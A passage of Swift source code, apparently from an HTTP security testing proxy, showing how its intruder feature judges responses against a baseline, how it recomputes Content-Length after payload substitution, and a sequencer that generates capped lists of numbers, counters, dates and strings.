    static func evaluate(response: HTTPMessage?,
                         config: IntruderConfig,
                         baselineStatus: Int?,
                         baselineLength: Int) -> Bool {
        if !config.matchMarker.isEmpty {
            guard let response else { return false }
            return response.bodyText.range(of: config.matchMarker, options: [.caseInsensitive]) != nil
        }

        let status = response?.status
        let length = response.map { wireLength($0) } ?? 0

        let statusOK: Bool
        switch config.matchStatus {
        case .unchanged: statusOK = status == baselineStatus
        case .changed: statusOK = status != baselineStatus
        case .equal(let value): statusOK = status == value
        case .inRange(let range): statusOK = status.map { range.contains($0) } ?? false
        }

        let sizeOK: Bool
        switch config.matchSize {
        case .unchanged: sizeOK = length == baselineLength
        case .changed: sizeOK = length != baselineLength
        case .equal(let value): sizeOK = length == value
        case .inRange(let range): sizeOK = range.contains(length)
        case .greaterThan(let value): sizeOK = length > value
        case .lessThan(let value): sizeOK = length < value
        }

        return statusOK && sizeOK
    }

    /// Status line + headers + body — everything `Content-Length` does not cover.
    static func wireLength(_ message: HTTPMessage) -> Int {
        message.startLine.utf8.count
            + message.headers.reduce(4) { $0 + $1.name.utf8.count + $1.value.utf8.count }
            + message.body.count
    }

    /// Payload substitution changes the body length, so `Content-Length` has to
    /// be refreshed. A declared chunked body is left untouched — `rawBytes`
    /// re-chunks it on the wire.
    static func reframe(_ request: HTTPMessage) -> HTTPMessage {
        guard !request.isChunkedDeclared else { return request }
        var message = request
        if message.body.isEmpty && message.method == "GET" {
            message.removeHeader("Content-Length")
        } else {
            message.setHeader("Content-Length", String(message.body.count))
        }
        return message
    }

    fileprivate func isCancelledNow(_ id: UUID) -> Bool { isCancelled(id) }
}

// ============================================================================
//  5. Sequencer
// ============================================================================

enum SequencerType: String, CaseIterable, Sendable {
    case numbers, positions, counter, dates, strings, custom

    var label: String {
        switch self {
        case .numbers: return "Numbers"
        case .positions: return "Positions"
        case .counter: return "Counter"
        case .dates: return "Dates"
        case .strings: return "Strings"
        case .custom: return "Custom"
        }
    }
}

struct SequencerConfig: Sendable {
    var type: SequencerType = .numbers
    var startValue: Int = 0
    var endValue: Int = 100
    var step: Int = 1
    var dateFormat: String = "yyyy-MM-dd"
    var baseDate: Date = Date()
    var strings: [String] = []
}

struct SequencerEngine {
    /// Hard ceiling so a bad range can never exhaust memory.
    static let maxItems: Int = 100_000

    /// Generates at most `count` strings (always capped by `maxItems`).
    static func generate(_ config: SequencerConfig, count: Int = 1000) -> [String] {
        let limit = max(0, min(count, maxItems))
        guard limit > 0 else { return [] }

        switch config.type {
        case .numbers, .positions:
            return numbers(config: config, limit: limit)

        case .counter:
            let stride = config.step == 0 ? 1 : abs(config.step)
            return (0..<limit).map { counterText(config.startValue + $0 * stride) }

        case .dates:
            return dates(config: config, limit: limit)

        case .strings, .custom:
            let source = config.strings
            guard !source.isEmpty else { return [] }
            return (0..<limit).map { source[$0 % source.count] }
        }
    }

    // MARK: - Private

    /// Ascending walk between `startValue` and `endValue`.
    ///
    /// A descending range requires a negative `step`; `startValue > endValue`
    /// with a positive (or zero) step yields an empty list instead of spinning.
    private static func numbers(config: SequencerConfig, limit: Int) -> [String] {
        let start = config.startValue
        let end = config.endValue
        let stride = config.step == 0 ? 1 : abs(config.step)

        var out: [String] = []
        out.reserveCapacity(min(limit, 1024))

        if start <= end {
            var n = start
            while n <= end, out.count < limit {
                out.append(String(n))
                n += stride
            }
        } else if config.step < 0 {
            var n = start
            while n >= end, out.count < limit {
                out.append(String(n))
                n -= stride
            }
        }
        return out
    }

    /// Six-digit, zero-padded counter (`000001`, `000002`, …).
    private static func counterText(_ value: Int) -> String {
        let text = String(value)
        guard text.count < 6 else { return text }
        return String(repeating: "0", count: 6 - text.count) + text
    }

    private static func dates(config: SequencerConfig, limit: Int) -> [String] {
        let formatter = DateFormatter()
        formatter.locale = Locale(identifier: "en_US_POSIX")
        formatter.timeZone = TimeZone(secondsFromGMT: 0)
        formatter.dateFormat = config.dateFormat.isEmpty ? "yyyy-MM-dd" : config.dateFormat
        // Reject an unusable pattern instead of emitting garbage.
        guard formatter.date(from: formatter.string(from: config.baseDate)) != nil else { return [] }

        let calendar = Calendar(identifier: .gregorian)
        let stride = config.step == 0 ? 1 : abs(config.step)
        var out: [String] = []
        out.reserveCapacity(min(limit, 1024))
        var current = config.baseDate
        for _ in 0..<limit {
            out.append(formatter.string(from: current))
            guard let next = calendar.date(byAdding: .day, value: stride, to: current) else { break }
            current = next
        }
        return out
    }
}